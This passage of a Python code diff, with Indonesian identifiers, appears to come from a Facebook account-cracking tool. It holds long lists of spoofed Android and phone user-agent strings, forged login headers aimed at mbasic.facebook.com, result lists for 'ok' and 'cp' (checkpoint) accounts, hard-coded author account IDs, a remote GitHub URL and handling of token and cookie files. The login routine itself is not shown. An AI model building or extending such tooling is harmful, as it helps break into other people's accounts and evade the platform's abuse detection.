6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']
-
-# INDICATION
-
-id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]
-
-cp = 0
-
+### Host & Penampungan
+host = "https://mbasic.facebook.com"
 ok = []
+cp = []
+ttl = []
+count = 1
+_putar_ = 0
+data_1 = {}
+data_2 = {}
+data_change_1 = {}
+data_change_2 = {}
+data_user = []
+header_grup = {"user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
+header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
+header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}
+url_businness = "https://business.facebook.com"
+ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
+web_fb = "https://www.facebook.com/"
 
+### Waktu & Tanggal
+__sekarang__ = datetime.now()
+__tahun__ = __sekarang__.year
+__bulan__ = __sekarang__.month
+__hari__  = __sekarang__.day
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+_list_bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
+_qwerty_ = 'https://github.com/Dapunta/elite/blob/main/hahaha.txt'
 try:
+    if __bulan__ < 0 or __bulan__ > 12:
+        _cici_cici_()
+    _bulan_sekarang_ = __bulan__ - 1
+except ValueError:
+    _cici_cici_()
+_bulan_ = _list_bulan_[_bulan_sekarang_]
+tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))
 
-	os.mkdir('/sdcard/')
+### Akun Author Jangan Diganti Nanti Error !!!
+_my_account_ = [
+    '1827084332','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620',
+    '100000729074466','607801156','100009340646547','1676993425','1767051257','100000287398094','100001085079906',
+    '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']
 
-except:pass
+### User Agent
+ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
+ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
+ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 
-# COLORS
+### Clear Login Session
+def bersih():
+    try:os.remove('token.txt')
+    except:pass
+    try:os.remove('cookies.txt')
+    except:pass
 
-x = '\33[m' 
-
-k = '\033[93m' 
-
-h = '\x1b[1;92m' 
-
-hh = '\033[32m' 
-
-u = '\033[95m' 
-
-K = '\033[95m' 
-
-kk = '\033[33m' 
-
-b = '\33[1;96m' 
-
-p = '\x1b[0;34m' 
-
-# Converter 
-
